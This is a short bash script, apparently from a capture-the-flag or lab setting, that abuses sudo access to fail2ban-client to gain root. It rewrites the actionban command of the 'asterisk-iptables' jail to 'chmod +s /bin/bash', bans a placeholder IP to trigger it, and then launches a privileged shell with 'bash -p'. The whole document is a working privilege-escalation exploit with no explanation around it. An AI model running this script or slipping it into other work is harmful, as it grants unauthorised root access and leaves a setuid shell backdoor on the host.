#!/bin/bash

JAIL="asterisk-iptables"
IP_TO_BAN="1.2.3.4"
ACTION="iptables-allports-ASTERISK"
echo "Getting Fail2ban status..."
sudo /usr/bin/fail2ban-client status
echo "Getting actions for $JAIL..."
sudo /usr/bin/fail2ban-client get $JAIL actions
echo "Getting action details for $JAIL, $ACTION, actionban..."
sudo /usr/bin/fail2ban-client get $JAIL action $ACTION actionban
echo "Changing action for $JAIL to enable chmod +s /bin/bash..."
sudo /usr/bin/fail2ban-client set $JAIL action $ACTION actionban 'chmod +s /bin/bash'
echo "Verifying the action change for $JAIL..."
sudo /usr/bin/fail2ban-client get $JAIL action $ACTION actionban
echo "Banning IP $IP_TO_BAN..."
sudo /usr/bin/fail2ban-client set $JAIL banip $IP_TO_BAN
echo "Starting a shell with setuid privileges..."
/bin/bash -p
